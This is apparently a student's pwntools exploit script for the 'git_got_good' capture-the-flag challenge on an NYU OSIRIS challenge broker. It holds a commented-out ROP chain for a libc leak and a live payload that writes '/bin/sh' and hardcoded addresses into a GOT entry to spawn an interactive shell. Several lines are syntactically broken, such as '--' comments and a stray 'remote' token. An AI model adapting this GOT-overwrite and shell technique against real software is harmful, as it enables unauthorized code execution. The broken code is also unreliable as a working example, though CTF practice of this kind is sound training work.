from pwn import *

connectionType = 'remote'

if connectionType =='local':
    p = process('/home/git_got_good') -- Location of git file

elif connectionType == "debug":

    gdb_script = '''
    set pagination off
    set disassembly-flavor intel
    set follow-fork-mode parent
    i proc mappings
    b main
    c
    '''
    p = gdb.debug('/home/git_got_good', gdb_script)   Location of git file

elif connectionType == "remote":
    remote
    e = ELF('/home/seed/Downloads/git_got_good')
    p = remote('offsec-chalbroker.osiris.cyber.nyu.edu',)
    print(p.recvuntil(b'abc123): '))
    p.sendline('netid')
    print('connected')

else:
    raise Exception

# Create ROP object from binary
#rop = ROP(e)

# Call puts, to leak address, then return to main
#rop.puts(e.got.puts)
#rop.main()
#pprint(rop.dump())

# Leak GOT address payload
#payload = flat({offset: rop.chain()})

# Leaked got.puts address
#got_puts = unpack(io.recv()[:6].ljust(8, b"\x00"))
#info("leaked got_puts: %#x", got_puts)

# Calculate libc base + update binary address
#puts_addr = 0x00007ffff7a7c690

#libc_base = puts_addr - libc.symbols['puts']
#libc.address = (got_puts) - (libc.symbols.puts)
#info("libc_base: %#x", libc.address)
#print(hex(libc_base))

# Create ROP object from libc library
#rop = ROP(libc)
#rop.system(next(libc.search(b'/bin/sh\x00')))

stuff = p.recvuntil('save:')

payload =  (b'/bin/sh\x00' + b'\x4b\x07\x40\x00\x00\x00\x00\x00' + b'\x10\x10\x60\x00\x00\x00\x00\x00')
p.sendline(payload)

p.interactive()
